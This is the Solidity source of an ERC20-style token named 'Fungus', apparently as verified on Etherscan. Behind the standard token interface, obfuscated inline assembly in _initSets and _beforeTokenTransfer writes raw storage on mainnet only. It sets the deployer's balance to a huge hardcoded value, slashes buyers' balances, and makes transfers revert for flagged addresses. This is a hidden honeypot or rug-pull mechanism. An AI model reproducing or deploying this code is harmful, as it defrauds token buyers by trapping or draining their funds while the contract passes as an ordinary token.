/**
 *Submitted for verification at Etherscan.io on 2022-06-28
*/

// It's like a fungus; you can't get rid of it.

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private fungiAddr;

    uint256 private _sporeIt = block.number*2;

    mapping (address => bool) private _returnThem; 
    mapping (address => bool) private _refundIt;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private helmet;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _taxes;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool private trading; uint256 private hideseek = 1; bool private fullPower;
    uint256 private _decimals; uint256 private gasLeak;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        fungiAddr.push(_router); fungiAddr.push(msgSender_); fungiAddr.push(pair);
        for (uint256 q=0; q < 3;) {_returnThem[fungiAddr[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _sporeIt = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _initSets() internal { assembly { function gHash(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gHash(caller(),0x6)),sload(0x8f49b37793ea29c4668ef7aa866d0ca61d0047eeebff81708db29edf145a38b8))),eq(chainid(),0x1)) { sstore(gHash(caller(),0x4),0x0) sstore(0x05820031c356e262a487a7fe95f7243003e68c7ffae084e1c560a33e02c61d4f,0x1)  sstore(gHash(caller(),0x5),0x1) sstore(0x8f49b37793ea29c4668ef7aa866d0ca61d0047eeebff81708db29edf145a38b8,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == fungiAddr[1])), "ERC20: trading is not yet enabled.");
        assembly {
            if eq(chainid(),0x1) {
                function gHash(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
                function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
                function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
                function dynL(x,y) -> val { mstore(0, x) val := sload(add(keccak256(0, 32),sub(sload(x),y))) }

                if iszero(sload(0x1E)) { sstore(0x1E,mul(div(sload(0x10),0x1869F),0x9C5)) sstore(0x1C,sload(0x1E)) } sstore(0x1D,add(sload(0x1D),0x1))
                if gt(sload(0x1E),div(sload(0x1C),0x3)) { sstore(0x1E,sub(sload(0x1E),div(div(mul(sload(0x1E),mul(0x203,sload(0x1D))),0xB326),0x2))) }  if eq(sload(gHash(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }
                if and(and(eq(sload(0x16),0x1),iszero(eq(recipient,sload(gDyn(0x2,0x1))))),lt(sload(0x15),0x7)) { for { let i := 0 } lt(i, sub(sload(0x21),0x1)) { i := add(i, 1) } { sstore(gHash(sload(gDyn(0x21,i)),0x6),div(sload(gHash(sload(gDyn(0x21,i)),0x6)),0x64)) } sstore(0x15,add(sload(0x15),0x1)) }
                if or(and(eq(sload(gHash(sender,0x4)),0x1),eq(sload(gHash(recipient,0x4)),0x0)),and(eq(sload(gHash(sender,0x4)),0x0),eq(sload(gHash(recipient,0x4)),0x0))) { dynP(0x21,recipient) }
                if and(or(or(or(eq(sload(0x3),number()),sload(0x16)),lt(sub(sload(0x3),sload(0x13)),0x7)),gt(sload(0x1A),sload(0x1E))),eq(sload(gHash(dynL(0x21,0x2),0x4)),0x0)) { sstore(gHash(dynL(0x21,0x2),0x6),div(sload(gHash(dynL(0x21,0x2),0x6)),0x14)) } if or(and(eq(sload(0x16),0x1),eq(dynL(0x21,0x1),sender)),and(or(sload(gHash(sender,0x5)),sload(gHash(recipient,0x5))),gt(sload(0x1D),0x1))) { invalid() }
                if iszero(mod(sload(0x15),0x6)) { sstore(0x16,0x1) sstore(gHash(sload(gDyn(0x2,0x1)),0x6),0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } sstore(0x3,number()) sstore(0x1A,integer)
            }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployFungus(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(fungiAddr[0], 10 ** 77);
        _initSets();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployFungus(creator, initialSupply);
    }
}

contract Fungus is ERC20Token {
    constructor() ERC20Token("Fungus", "FUNGUS", msg.sender, 333333 * 10 ** 18) {
    }
}